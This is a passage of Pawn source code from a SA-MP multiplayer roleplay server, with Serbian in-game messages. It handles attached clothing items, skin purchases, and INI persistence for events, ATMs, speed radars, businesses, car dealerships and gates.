	            EditAttachedObject( playerid, OBJECT_SLOT_HEAD );
	            SendErrorMessage( playerid, "Losa pozicija kape/marame/sesira odradi je ponovo." );
	            return true;
	        }
            PlayerInfo[ playerid ][ xHeadPos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xHeadPos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xHeadPos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xHeadPos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xHeadPos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xHeadPos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xHeadPos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
        else if( EditingBody[ playerid ] == 5 ) {

            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
	            EditAttachedObject( playerid, OBJECT_SLOT_HEAD );
	            SendErrorMessage( playerid, "Losa pozicija kape/marame/sesira odradi je ponovo." );
	            return true;
	        }
            PlayerInfo[ playerid ][ xHeadPos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xHeadPos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xHeadPos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xHeadPos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xHeadPos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xHeadPos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xHeadPos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
        else if( EditingBody[ playerid ] == 6 ) {

            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
	            EditAttachedObject( playerid, OBJECT_SLOT_HELMET );
	            SendErrorMessage( playerid, "Losa pozicija kacige odradi je ponovo." );
	            return true;
	        }
            PlayerInfo[ playerid ][ xHelmetPos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xHelmetPos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xHelmetPos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xHelmetPos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xHelmetPos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xHelmetPos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
    }
    
	if( !response ) {
	    if( EditingBody[ playerid ] == 1 ) {
	        RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL );
	    	SungOn[ playerid ] = false;
	    }
	    else if( EditingBody[ playerid ] == 2 ) {
	        RemovePlayerAttachedObject( playerid, OBJECT_SLOT_BANDANA );
	    	FaceOn[ playerid ] = false;
	    }
	    else if( EditingBody[ playerid ] >= 3 && EditingBody[ playerid ] <= 5 ) {
	        RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HEAD );
	    	HeadOn[ playerid ] = false;
	    }
	    else if( EditingBody[ playerid ] == 6 ) {
	        RemovePlayerAttachedObject( playerid, OBJECT_SLOT_HELMET );
	    	HelmetOn[ playerid ] = false;
	    }
	}
	
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerModelSelection( playerid, response, listid, modelid) {
    if(listid == skinlist) {
        if( response ) {
            if( PlayerInfo[ playerid ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Ne mozete kupiti skin jer ste u organizaciji." );
            if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, " Nemate dovoljno novca(500 $)." );
            SendInfoMessage( playerid, "Kupio si odecu za 500$.");
            PlayerInfo[ playerid ][ xSkin ] = modelid;
            PostaviSkin( playerid, modelid );
 			
            SavePlayer( playerid ); DajIgracuNovac( playerid, -500 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 300 );
        }
        else SCM( playerid, CRVENA, "Ugasio si kupovinu odece.");
        return 1;
    }
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerModelSelectionEx( playerid, response, extraid, modelid)
{
    if(extraid == 1)
    {
        if( response )
        {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL, modelid, 2, 0.10, 0.03, 0, 0, 90, 90, 1.2, 1.2, 1.4 );
            EditAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL); EditingBody[ playerid ] = 1;
            PlayerInfo[ playerid ][ xSungMask ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -400 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 210); SungOn[ playerid ] = true;
        }
	}
	else if(extraid == 2)
    {
        if( response )
        {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_BANDANA, modelid, 2, 0.09, 0.02, -0.01, -90, 0, -90, 1.15, 1.15, 1.15 );
            EditAttachedObject( playerid, OBJECT_SLOT_BANDANA); EditingBody[ playerid ] = 2;
            PlayerInfo[ playerid ][ xFace ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -500 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 210); FaceOn[ playerid ] = true;
        }
	}
	else if(extraid == 3)
    {
        if( response )
        {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_HEAD, modelid, 2, 0.12, 0.01 ,0, -90, 0, -90, 1.2, 1.2, 1.1 );
            EditAttachedObject( playerid, OBJECT_SLOT_HEAD); EditingBody[ playerid ] = 3;
            PlayerInfo[ playerid ][ xHead ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -500 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 210); HeadOn[ playerid ] = true;
        }
	}
	else if(extraid == 4)
    {
        if( response )
        {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_HEAD, modelid, 2,0.15,0.02,-0.01,0,0,0,1.3,1.2,1.3);
            EditAttachedObject( playerid, OBJECT_SLOT_HEAD); EditingBody[ playerid ] = 4;
            PlayerInfo[ playerid ][ xHead ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -700 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 210); HeadOn[ playerid ] = true;
        }
	}
	else if(extraid == 5)
    {
        if( response )
        {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_HEAD, modelid, 2,0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);
            EditAttachedObject( playerid, OBJECT_SLOT_HEAD); EditingBody[ playerid ] = 5;
            PlayerInfo[ playerid ][ xHead ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -600 );
            BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 210); HeadOn[ playerid ] = true;
        }
	}
	else if( extraid == 7 ) {
	    if( response ) {
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_HELMET, modelid, 2, 0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000 );
			EditAttachedObject( playerid, OBJECT_SLOT_HELMET ); EditingBody[ playerid ] = 6;
            PlayerInfo[ playerid ][ xHelmet ] = modelid; SavePlayer( playerid ); DajIgracuNovac( playerid, -100 );
            HelmetOn[ playerid ] = true;
	    }
    }
    return 1;
}
//------------------------------------------------------------------------------
public LoadEvent(id, name[], value[])
{
	new string[6];
    INI_String( "Name", Event[ id ][ Name ], 64 );
    INI_Float( "TCPX", Event[ id ][ TCPX ] );
    INI_Float( "TCPY", Event[ id ][ TCPY ] );
    INI_Float( "TCPZ", Event[ id ][ TCPZ ] );
    INI_Float( "TCPA", Event[ id ][ TCPA ] );
    INI_Float( "TCPX2", Event[ id ][ TCPX2 ] );
    INI_Float( "TCPY2", Event[ id ][ TCPY2 ] );
    INI_Float( "TCPZ2", Event[ id ][ TCPZ2 ] );
    INI_Float( "TCPA2", Event[ id ][ TCPA2 ] );
    INI_Int( "Veh", Event[ id ][ VehID ] );
    for( new i = 2; i <= MAX_CP; i++)
    {
	    format( string, 6, "CPX%d",i);
	    INI_Float( string, CheckPoint[ id ][ i ][ CPX ] );
	    format( string, 6,"CPY%d",i);
	    INI_Float( string, CheckPoint[ id ][ i ][ CPY ] );
	    format( string, 6, "CPZ%d",i);
	    INI_Float( string, CheckPoint[ id ][ i ][ CPZ ] );
    }
    INI_Int( "MaxCP", Event[ id ][ MaxCP ] );
    return 1;
}
//------------------------------------------------------------------------------
public OcitajKont( id, name[], value[] )
{
	INI_Float( "ObjPos1", KontInfo[ id ][ koObjPos ][ 0 ] );
    INI_Float( "ObjPos2", KontInfo[ id ][ koObjPos ][ 1 ] );
    INI_Float( "ObjPos3", KontInfo[ id ][ koObjPos ][ 2 ] );
    INI_Float( "ObjRot1", KontInfo[ id ][ koObjRot ][ 0 ] );
    INI_Float( "ObjRot2", KontInfo[ id ][ koObjRot ][ 1 ] );
    INI_Float( "ObjRot3", KontInfo[ id ][ koObjRot ][ 2 ] );
    return true;
}
//------------------------------------------------------------------------------
public LoadATM( id, name[], value[] )
{
	INI_Float( "atmPos1", atmInfo[ id ][ atmPos ][ 0 ] );
    INI_Float( "atmPos2", atmInfo[ id ][ atmPos ][ 1 ] );
    INI_Float( "atmPos3", atmInfo[ id ][ atmPos ][ 2 ] );
    INI_Float( "atmPos4", atmInfo[ id ][ atmPos ][ 3 ] );
    INI_Float( "atmPos5", atmInfo[ id ][ atmPos ][ 4 ] );
    INI_Float( "atmPos6", atmInfo[ id ][ atmPos ][ 5 ] );
    INI_Bool( "atmPreseceneZice", atmInfo[ id ][ atmPreseceneZice ] );
	INI_Bool( "atmProbijenBios", atmInfo[ id ][ atmProbijenBios ] );
	INI_Int( "atmVremeDoRoba", atmInfo[ id ][ atmVremeDoRoba ] );
	INI_Bool( "atmExists", atmInfo[ id ][ atmExists ] );
    return true;
}
//------------------------------------------------------------------------------
public SacuvajKont( id )
{
    new file4[ 40 ];
    format( file4, sizeof( file4 ), KO_FILE, id );
    new INI:File = INI_Open( file4 );
    INI_WriteFloat( File, "ObjPos1", KontInfo[ id ][ koObjPos ][ 0 ] );
    INI_WriteFloat( File, "ObjPos2", KontInfo[ id ][ koObjPos ][ 1 ] );
    INI_WriteFloat( File, "ObjPos3", KontInfo[ id ][ koObjPos ][ 2 ] );
    INI_WriteFloat( File, "ObjRot1", KontInfo[ id ][ koObjRot ][ 0 ] );
    INI_WriteFloat( File, "ObjRot2", KontInfo[ id ][ koObjRot ][ 1 ] );
    INI_WriteFloat( File, "ObjRot3", KontInfo[ id ][ koObjRot ][ 2 ] );
    INI_Close( File );
    return true;
}
//------------------------------------------------------------------------------
public SacuvajATM( id )
{
    new file4[ 40 ];
    format( file4, sizeof( file4 ), ATM_FILE, id );
    new INI:File = INI_Open( file4 );
    INI_WriteFloat( File, "atmPos1", atmInfo[ id ][ atmPos ][ 0 ] );
	INI_WriteFloat( File, "atmPos2", atmInfo[ id ][ atmPos ][ 1 ] );
	INI_WriteFloat( File, "atmPos3", atmInfo[ id ][ atmPos ][ 2 ] );
	INI_WriteFloat( File, "atmPos4", atmInfo[ id ][ atmPos ][ 3 ] );
	INI_WriteFloat( File, "atmPos5", atmInfo[ id ][ atmPos ][ 4 ] );
	INI_WriteFloat( File, "atmPos6", atmInfo[ id ][ atmPos ][ 5 ] );
	INI_WriteBool( File, "atmPreseceneZice", atmInfo[ id ][ atmPreseceneZice ] );
	INI_WriteBool( File, "atmProbijenBios", atmInfo[ id ][ atmProbijenBios ] );
	INI_WriteInt( File, "atmVremeDoRoba", atmInfo[ id ][ atmVremeDoRoba ] );
	INI_WriteBool( File, "atmExists", atmInfo[ id ][ atmExists ] );
    INI_Close( File );
    return true;
}
//------------------------------------------------------------------------------
forward LoadRadar( radarID, name[], value[] );
public LoadRadar( radarID, name[], value[] ) {

    INI_Int( "MaxSpeed", radarInfo[ radarID ][ radarMaxSpeed ] );
    INI_Int( "Price", radarInfo[ radarID ][ radarPrice ] );
	INI_Float( "Pos1", radarInfo[ radarID ][ radarPos ][ 0 ] );
    INI_Float( "Pos2", radarInfo[ radarID ][ radarPos ][ 1 ] );
    INI_Float( "Pos3", radarInfo[ radarID ][ radarPos ][ 2 ] );
    INI_Float( "Pos4", radarInfo[ radarID ][ radarPos ][ 3 ] );
    INI_Float( "Pos5", radarInfo[ radarID ][ radarPos ][ 4 ] );
    INI_Float( "Pos6", radarInfo[ radarID ][ radarPos ][ 5 ] );
	
    return true;
}
stock SaveRadar( radarID ) {

    new file4[ 64 ];
    format( file4, sizeof( file4 ), F_RADARS, radarID );
    new INI:File = INI_Open( file4 );
    INI_WriteInt( File, "MaxSpeed", radarInfo[ radarID ][ radarMaxSpeed ] );
	INI_WriteInt( File, "Price", radarInfo[ radarID ][ radarPrice ] );
    INI_WriteFloat( File, "Pos1", radarInfo[ radarID ][ radarPos ][ 0 ] );
	INI_WriteFloat( File, "Pos2", radarInfo[ radarID ][ radarPos ][ 1 ] );
	INI_WriteFloat( File, "Pos3", radarInfo[ radarID ][ radarPos ][ 2 ] );
	INI_WriteFloat( File, "Pos4", radarInfo[ radarID ][ radarPos ][ 3 ] );
	INI_WriteFloat( File, "Pos5", radarInfo[ radarID ][ radarPos ][ 4 ] );
	INI_WriteFloat( File, "Pos6", radarInfo[ radarID ][ radarPos ][ 5 ] );
    INI_Close( File );

    return true;
}
//------------------------------------------------------------------------------
public OcitajFirmu(idx, name[], value[])
{
    INI_Int( "Kupljen", BussinesInfo[ idx ][bOwned] );
    INI_Int( "Cena", BussinesInfo[ idx ][ bPrice] );
    INI_String( "Vlasnik", BussinesInfo[ idx ][ bOwner], MAX_PLAYER_NAME);
    INI_Int( "Tip", BussinesInfo[ idx ][ bType] );
    INI_Int( "Zakljucana", BussinesInfo[ idx ][ bLocked] );
    INI_Int( "Novac", BussinesInfo[ idx ][ bMoney] );
    INI_Float( "UlazX", BussinesInfo[ idx ][ bEnterX] );
    INI_Float( "UlazY", BussinesInfo[ idx ][ bEnterY] );
    INI_Float( "UlazZ", BussinesInfo[ idx ][ bEnterZ] );
    INI_Float( "IzasaoX", BussinesInfo[ idx ][ bExitX] );
    INI_Float( "IzasaoY", BussinesInfo[ idx ][ bExitY] );
    INI_Float( "IzasaoZ", BussinesInfo[ idx ][ bExitZ] );
    INI_Int( "Int", BussinesInfo[ idx ][ bInt] );
    INI_Int( "VW", BussinesInfo[ idx ][ bVW] );
    INI_Int( "Uinterioru", BussinesInfo[ idx ][ bInInt] );
    INI_Int( "Produkti", BussinesInfo[ idx ][ bProducts] );
    INI_Int( "PProdukti", BussinesInfo[ idx ][ bNProducts ] );
    INI_Int( "CenaProdukta", BussinesInfo[ idx ][ bPriceProdukta ] );
    INI_Int( "Uvw", BussinesInfo[ idx ][ bInVW] );
    INI_String( "Ime", BussinesInfo[ idx ][ bName ], 64 );
    INI_Int( "Level", BussinesInfo[ idx ][ bLevel ] );
    INI_Int( "JobID", BussinesInfo[ idx ][ bJobID ] );
    INI_Int( "Neaktivnost", BussinesInfo[ idx ][ bNeaktivnost ] );
    return true;
}
//------------------------------------------------------------------------------
public SaveBussines( id ) {
    new file4[ 40 ];
    format( file4, sizeof( file4 ), F_FILE, id );
    new INI:File = INI_Open( file4 );
    INI_SetTag( File, "Informacije");
    INI_WriteInt( File, "Kupljen", BussinesInfo[ id ][ bOwned] );
    INI_WriteInt( File, "Cena", BussinesInfo[ id ][ bPrice] );
    INI_WriteString( File, "Vlasnik", BussinesInfo[ id ][ bOwner] );
    INI_WriteInt( File, "Tip", BussinesInfo[ id ][ bType] );
    INI_WriteInt( File, "Zakljucana", BussinesInfo[ id ][ bLocked] );
    INI_WriteInt( File, "Novac", BussinesInfo[ id ][ bMoney] );
    INI_WriteFloat( File, "UlazX", BussinesInfo[ id ][ bEnterX] );
    INI_WriteFloat( File, "UlazY", BussinesInfo[ id ][ bEnterY] );
    INI_WriteFloat( File, "UlazZ", BussinesInfo[ id ][ bEnterZ] );
    INI_WriteFloat( File, "IzasaoX", BussinesInfo[ id ][ bExitX] );
    INI_WriteFloat( File, "IzasaoY", BussinesInfo[ id ][ bExitY] );
    INI_WriteFloat( File, "IzasaoZ", BussinesInfo[ id ][ bExitZ] );
    INI_WriteInt( File, "Int", BussinesInfo[ id ][ bInt] );
    INI_WriteInt( File, "VW", BussinesInfo[ id ][ bVW] );
    INI_WriteInt( File, "Uinterioru", BussinesInfo[ id ][ bInInt] );
    INI_WriteInt( File, "Produkti", BussinesInfo[ id ][ bProducts] );
    INI_WriteInt( File, "PProdukti", BussinesInfo[ id ][ bNProducts ] );
    INI_WriteInt( File, "CenaProdukta", BussinesInfo[ id ][ bPriceProdukta ] );
    INI_WriteInt( File, "Uvw", BussinesInfo[ id ][ bInVW] );
    INI_WriteString( File, "Ime", BussinesInfo[ id ][ bName] );
    INI_WriteInt( File, "Level", BussinesInfo[ id ][ bLevel ] );
    INI_WriteInt( File, "JobID", BussinesInfo[ id ][ bJobID ] );
    INI_WriteInt( File, "Neaktivnost", BussinesInfo[ id ][ bNeaktivnost ] );
    INI_Close( File );
    return true;
}
//------------------------------------------------------------------------------
forward SaveSalon( id );
public SaveSalon( id ) {
	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), AS_FILE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteInt( File, "MaxVehModel", AutoSalon[ id ][ aMaxVehModel ] );
	INI_WriteInt( File, "VehModel1", AutoSalon[ id ][ aVehModel ][ 0 ] );
	INI_WriteInt( File, "VehModel2", AutoSalon[ id ][ aVehModel ][ 1 ] );
	INI_WriteInt( File, "VehModel3", AutoSalon[ id ][ aVehModel ][ 2 ] );
	INI_WriteInt( File, "VehModel4", AutoSalon[ id ][ aVehModel ][ 3 ] );
	INI_WriteInt( File, "VehModel5", AutoSalon[ id ][ aVehModel ][ 4 ] );
	INI_WriteInt( File, "VehModel6", AutoSalon[ id ][ aVehModel ][ 5 ] );
	INI_WriteInt( File, "VehModel7", AutoSalon[ id ][ aVehModel ][ 6 ] );
	INI_WriteInt( File, "VehModel8", AutoSalon[ id ][ aVehModel ][ 7 ] );
	INI_WriteInt( File, "VehModel9", AutoSalon[ id ][ aVehModel ][ 8 ] );
	INI_WriteInt( File, "VehModel10", AutoSalon[ id ][ aVehModel ][ 9 ] );
	INI_WriteInt( File, "VehModel11", AutoSalon[ id ][ aVehModel ][ 10 ] );
	INI_WriteInt( File, "VehModel12", AutoSalon[ id ][ aVehModel ][ 11 ] );
	INI_WriteInt( File, "VehModel13", AutoSalon[ id ][ aVehModel ][ 12 ] );
	INI_WriteInt( File, "VehModel14", AutoSalon[ id ][ aVehModel ][ 13 ] );
	INI_WriteInt( File, "VehModel15", AutoSalon[ id ][ aVehModel ][ 14 ] );
	INI_WriteInt( File, "VehModel16", AutoSalon[ id ][ aVehModel ][ 15 ] );
	INI_WriteInt( File, "VehAmmount1", AutoSalon[ id ][ aVehAmmount ][ 0 ] );
	INI_WriteInt( File, "VehAmmount2", AutoSalon[ id ][ aVehAmmount ][ 1 ] );
	INI_WriteInt( File, "VehAmmount3", AutoSalon[ id ][ aVehAmmount ][ 2 ] );
	INI_WriteInt( File, "VehAmmount4", AutoSalon[ id ][ aVehAmmount ][ 3 ] );
	INI_WriteInt( File, "VehAmmount5", AutoSalon[ id ][ aVehAmmount ][ 4 ] );
	INI_WriteInt( File, "VehAmmount6", AutoSalon[ id ][ aVehAmmount ][ 5 ] );
	INI_WriteInt( File, "VehAmmount7", AutoSalon[ id ][ aVehAmmount ][ 6 ] );
	INI_WriteInt( File, "VehAmmount8", AutoSalon[ id ][ aVehAmmount ][ 7 ] );
	INI_WriteInt( File, "VehAmmount9", AutoSalon[ id ][ aVehAmmount ][ 8 ] );
	INI_WriteInt( File, "VehAmmount10", AutoSalon[ id ][ aVehAmmount ][ 9 ] );
	INI_WriteInt( File, "VehAmmount11", AutoSalon[ id ][ aVehAmmount ][ 10 ] );
	INI_WriteInt( File, "VehAmmount12", AutoSalon[ id ][ aVehAmmount ][ 11 ] );
	INI_WriteInt( File, "VehAmmount13", AutoSalon[ id ][ aVehAmmount ][ 12 ] );
	INI_WriteInt( File, "VehAmmount14", AutoSalon[ id ][ aVehAmmount ][ 13 ] );
	INI_WriteInt( File, "VehAmmount15", AutoSalon[ id ][ aVehAmmount ][ 14 ] );
	INI_WriteInt( File, "VehAmmount16", AutoSalon[ id ][ aVehAmmount ][ 15 ] );
	INI_WriteFloat( File, "VehBuyedPosX", AutoSalon[ id ][ aVehBuyedPos ][ 0 ] );
	INI_WriteFloat( File, "VehBuyedPosY", AutoSalon[ id ][ aVehBuyedPos ][ 1 ] );
	INI_WriteFloat( File, "VehBuyedPosZ", AutoSalon[ id ][ aVehBuyedPos ][ 2 ] );
	INI_WriteFloat( File, "VehBuyedPosA", AutoSalon[ id ][ aVehBuyedPos ][ 3 ] );
	INI_WriteFloat( File, "PickupPosX", AutoSalon[ id ][ aPickupPos ][ 0 ] );
	INI_WriteFloat( File, "PickupPosY", AutoSalon[ id ][ aPickupPos ][ 1 ] );
	INI_WriteFloat( File, "PickupPosZ", AutoSalon[ id ][ aPickupPos ][ 2 ] );
	INI_WriteFloat( File, "CameraPosX", AutoSalon[ id ][ aCameraPos ][ 0 ] );
	INI_WriteFloat( File, "CameraPosY", AutoSalon[ id ][ aCameraPos ][ 1 ] );
	INI_WriteFloat( File, "CameraPosZ", AutoSalon[ id ][ aCameraPos ][ 2 ] );
	INI_WriteFloat( File, "CameraLookAtX", AutoSalon[ id ][ aCameraLookAt ][ 0 ] );
	INI_WriteFloat( File, "CameraLookAtY", AutoSalon[ id ][ aCameraLookAt ][ 1 ] );
	INI_WriteFloat( File, "CameraLookAtZ", AutoSalon[ id ][ aCameraLookAt ][ 2 ] );
	INI_WriteInt( File, "VirtualW", AutoSalon[ id ][ aVW ] );
	INI_WriteInt( File, "Interior", AutoSalon[ id ][ aInt ] );
	INI_WriteInt( File, "IzlogVeh", AutoSalon[ id ][ aIzlogVeh ] );
	INI_Close( File );
	return 1;
}
//------------------------------------------------------------------------------
forward LoadSalon( id, name[], value[] );
public LoadSalon( id, name[], value[] ) {
    INI_Int( "MaxVehModel", AutoSalon[ id ][ aMaxVehModel ] );
	INI_Int( "VehModel1", AutoSalon[ id ][ aVehModel ][ 0 ] );
	INI_Int( "VehModel2", AutoSalon[ id ][ aVehModel ][ 1 ] );
	INI_Int( "VehModel3", AutoSalon[ id ][ aVehModel ][ 2 ] );
	INI_Int( "VehModel4", AutoSalon[ id ][ aVehModel ][ 3 ] );
	INI_Int( "VehModel5", AutoSalon[ id ][ aVehModel ][ 4 ] );
	INI_Int( "VehModel6", AutoSalon[ id ][ aVehModel ][ 5 ] );
	INI_Int( "VehModel7", AutoSalon[ id ][ aVehModel ][ 6 ] );
	INI_Int( "VehModel8", AutoSalon[ id ][ aVehModel ][ 7 ] );
	INI_Int( "VehModel9", AutoSalon[ id ][ aVehModel ][ 8 ] );
	INI_Int( "VehModel10", AutoSalon[ id ][ aVehModel ][ 9 ] );
	INI_Int( "VehModel11", AutoSalon[ id ][ aVehModel ][ 10 ] );
	INI_Int( "VehModel12", AutoSalon[ id ][ aVehModel ][ 11 ] );
	INI_Int( "VehModel13", AutoSalon[ id ][ aVehModel ][ 12 ] );
	INI_Int( "VehModel14", AutoSalon[ id ][ aVehModel ][ 13 ] );
	INI_Int( "VehModel15", AutoSalon[ id ][ aVehModel ][ 14 ] );
	INI_Int( "VehModel16", AutoSalon[ id ][ aVehModel ][ 15 ] );
	INI_Int( "VehAmmount1", AutoSalon[ id ][ aVehAmmount ][ 0 ] );
	INI_Int( "VehAmmount2", AutoSalon[ id ][ aVehAmmount ][ 1 ] );
	INI_Int( "VehAmmount3", AutoSalon[ id ][ aVehAmmount ][ 2 ] );
	INI_Int( "VehAmmount4", AutoSalon[ id ][ aVehAmmount ][ 3 ] );
	INI_Int( "VehAmmount5", AutoSalon[ id ][ aVehAmmount ][ 4 ] );
	INI_Int( "VehAmmount6", AutoSalon[ id ][ aVehAmmount ][ 5 ] );
	INI_Int( "VehAmmount7", AutoSalon[ id ][ aVehAmmount ][ 6 ] );
	INI_Int( "VehAmmount8", AutoSalon[ id ][ aVehAmmount ][ 7 ] );
	INI_Int( "VehAmmount9", AutoSalon[ id ][ aVehAmmount ][ 8 ] );
	INI_Int( "VehAmmount10", AutoSalon[ id ][ aVehAmmount ][ 9 ] );
	INI_Int( "VehAmmount11", AutoSalon[ id ][ aVehAmmount ][ 10 ] );
	INI_Int( "VehAmmount12", AutoSalon[ id ][ aVehAmmount ][ 11 ] );
	INI_Int( "VehAmmount13", AutoSalon[ id ][ aVehAmmount ][ 12 ] );
	INI_Int( "VehAmmount14", AutoSalon[ id ][ aVehAmmount ][ 13 ] );
	INI_Int( "VehAmmount15", AutoSalon[ id ][ aVehAmmount ][ 14 ] );
	INI_Int( "VehAmmount16", AutoSalon[ id ][ aVehAmmount ][ 15 ] );
	INI_Float( "VehBuyedPosX", AutoSalon[ id ][ aVehBuyedPos ][ 0 ] );
	INI_Float( "VehBuyedPosY", AutoSalon[ id ][ aVehBuyedPos ][ 1 ] );
	INI_Float( "VehBuyedPosZ", AutoSalon[ id ][ aVehBuyedPos ][ 2 ] );
	INI_Float( "VehBuyedPosA", AutoSalon[ id ][ aVehBuyedPos ][ 3 ] );
	INI_Float( "PickupPosX", AutoSalon[ id ][ aPickupPos ][ 0 ] );
	INI_Float( "PickupPosY", AutoSalon[ id ][ aPickupPos ][ 1 ] );
	INI_Float( "PickupPosZ", AutoSalon[ id ][ aPickupPos ][ 2 ] );
	INI_Float( "CameraPosX", AutoSalon[ id ][ aCameraPos ][ 0 ] );
	INI_Float( "CameraPosY", AutoSalon[ id ][ aCameraPos ][ 1 ] );
	INI_Float( "CameraPosZ", AutoSalon[ id ][ aCameraPos ][ 2 ] );
	INI_Float( "CameraLookAtX", AutoSalon[ id ][ aCameraLookAt ][ 0 ] );
	INI_Float( "CameraLookAtY", AutoSalon[ id ][ aCameraLookAt ][ 1 ] );
	INI_Float( "CameraLookAtZ", AutoSalon[ id ][ aCameraLookAt ][ 2 ] );
	INI_Int( "VirtualW", AutoSalon[ id ][ aVW ] );
	INI_Int( "Interior", AutoSalon[ id ][ aInt ] );
	INI_Int( "IzlogVeh", AutoSalon[ id ][ aIzlogVeh ] );
    return true;
}
//------------------------------------------------------------------------------
stock SaveGate( id ) {
	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), GATE_FILE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteString( File, "Owner", GateData[ id ][ gateOwner ] );
	INI_WriteInt( File, "Model", GateData[ id ][ gateModel ] );
	INI_WriteInt( File, "For", GateData[ id ][ gateFor ] );
	INI_WriteInt( File, "OrgID", GateData[ id ][ gateOrgID ] );
	INI_WriteFloat( File, "Speed", GateData[ id ][ gateSpeed ] );
	INI_WriteFloat( File, "Radius", GateData[ id ][ gateRadius ] );
	INI_WriteInt( File, "Time", GateData[ id ][ gateTime ] );
	INI_WriteFloat( File, "Pos1", GateData[ id ][ gatePos ][ 0 ] );
	INI_WriteFloat( File, "Pos2", GateData[ id ][ gatePos ][ 1 ] );
	INI_WriteFloat( File, "Pos3", GateData[ id ][ gatePos ][ 2 ] );
	INI_WriteFloat( File, "Pos4", GateData[ id ][ gatePos ][ 3 ] );
	INI_WriteFloat( File, "Pos5", GateData[ id ][ gatePos ][ 4 ] );
	INI_WriteFloat( File, "Pos6", GateData[ id ][ gatePos ][ 5 ] );
	INI_WriteInt( File, "Interior", GateData[ id ][ gateInterior ] );
	INI_WriteInt( File, "World", GateData[ id ][ gateWorld ] );
	INI_WriteFloat( File, "Move1", GateData[ id ][ gateMove ][ 0 ] );
	INI_WriteFloat( File, "Move2", GateData[ id ][ gateMove ][ 1 ] );
	INI_WriteFloat( File, "Move3", GateData[ id ][ gateMove ][ 2 ] );
	INI_WriteFloat( File, "Move4", GateData[ id ][ gateMove ][ 3 ] );
	INI_WriteFloat( File, "Move5", GateData[ id ][ gateMove ][ 4 ] );
	INI_WriteFloat( File, "Move6", GateData[ id ][ gateMove ][ 5 ] );
	INI_Close( File );
	return 1;
}
//------------------------------------------------------------------------------
forward LoadGate( id, name[], value[] );
public LoadGate( id, name[], value[] ) {

	INI_String( "Owner", GateData[ id ][ gateOwner ], MAX_PLAYER_NAME );
	INI_Int( "Model", GateData[ id ][ gateModel ] );
	INI_Int( "For", GateData[ id ][ gateFor ] );
	INI_Int( "OrgID", GateData[ id ][ gateOrgID ] );
	INI_Float( "Speed", GateData[ id ][ gateSpeed ] );
	INI_Float( "Radius", GateData[ id ][ gateRadius ] );
	INI_Int( "Time", GateData[ id ][ gateTime ] );
	INI_Float( "Pos1", GateData[ id ][ gatePos ][ 0 ] );
	INI_Float( "Pos2", GateData[ id ][ gatePos ][ 1 ] );
	INI_Float( "Pos3", GateData[ id ][ gatePos ][ 2 ] );
	INI_Float( "Pos4", GateData[ id ][ gatePos ][ 3 ] );
